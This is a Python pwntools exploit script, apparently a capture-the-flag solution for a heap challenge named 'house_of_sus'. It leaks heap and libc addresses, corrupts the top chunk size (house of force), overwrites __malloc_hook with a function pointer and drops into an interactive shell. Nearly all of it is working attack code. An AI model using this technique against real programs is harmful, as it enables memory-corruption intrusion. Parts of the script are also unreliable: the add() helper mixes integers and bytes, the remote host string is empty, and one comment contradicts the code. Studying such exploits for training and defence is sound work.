#!/usr/bin/env python3

from pwn import *

exe = ELF("./house_of_sus_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe

# split tmux pane
context.terminal = ["tmux", "splitw", "-vf","-p", "70"]
# spawn new window
# context.terminal = ["tmux", "neww", "-n", "shell"]

#context.log_level = "debug"
DOCKER_PORT		= 1337
REMOTE_NC_CMD	= "nc "	# `nc <host> <port>`

ELF.binsh = lambda self: next(self.search(b"/bin/sh\0"))
bstr = lambda x: str(x).encode()
aleak = lambda elfname, addr: log.info(elfname + " @ 0x" + format(addr, 'x'))
vleak = lambda valname, val: log.info(valname + " @ 0x" + format(val, 'x'))
chunks = lambda data: [data[i:i+context.bytes] for i in range(0, len(data), context.bytes)]

GDB_SCRIPT = """
b *call_emergency_meeting+108
c
"""

if args.GDB:
    r = gdb.debug(exe.path,gdbscript=GDB_SCRIPT)
elif args.LOCAL:
    r = process(exe.path)
elif args.DOCKER:
    r = remote("localhost", DOCKER_PORT)
else:
    r = remote(REMOTE_NC_CMD.split()[1], int(REMOTE_NC_CMD.split()[2]))


ru  = lambda *x, **y: r.recvuntil(*x, **y)
rl  = lambda *x, **y: r.recvline(*x, **y)
rc  = lambda *x, **y: r.recv(*x, **y)
sla = lambda *x, **y: r.sendlineafter(*x, **y)
sa  = lambda *x, **y: r.sendafter(*x, **y)
sl  = lambda *x, **y: r.sendline(*x, **y)
sn  = lambda *x, **y: r.send(*x, **y)

def add(size, data):
    sla("meeting", "3")
    sl(size + b" " + data)
    sla("You", "1")

'''
vuln: no check on malloc size before calling,
malloc can even fail or work with arbitrary size 
trick top chunk into a mega size (0xfff.....)
-> house of force to return an arb location
-> overwrite malloc hook with one gadget in GOT!!!

'''


def main():
	
	r.recvuntil(b'game: ')

    # Get malloc leak
	heap_start = int(ru(b'\n').decode('utf-8'), 16) - 0x660
	log.progress("Got malloc start: ", hex(heap_start))

	#libc leak 
	sl(b'1')

	sl(b'2')
	ru(b'seed: ')
	rand_addr = int(ru(b'\n').decode("utf-8"))
	libc.address = rand_addr - libc.sym.rand 
	aleak("rand",rand_addr)
	aleak("libc", libc.address)
	giga_size = 0xFFFFFFFFFFFFFFFF
	#trick heap top chunk (mega size to not call mmap!!)
	sl(b'1')
	ru(b'meeting')


	add(8,b'')
	add(8,b'')
	add(24,b'a'*24 + p64(giga_size))

	dist = libc.sym.__malloc_hook - heap_start - 0x1090 
	add(dist, "/bin/sh\0")
	add(24, p64(exe.sym['be_imposter'])) 

	sl(b'3')
	ru(b':(')
	sl(str(heap_start+0x1080).encode('utf-8'))


	r.interactive()


if __name__ == "__main__":
    main()
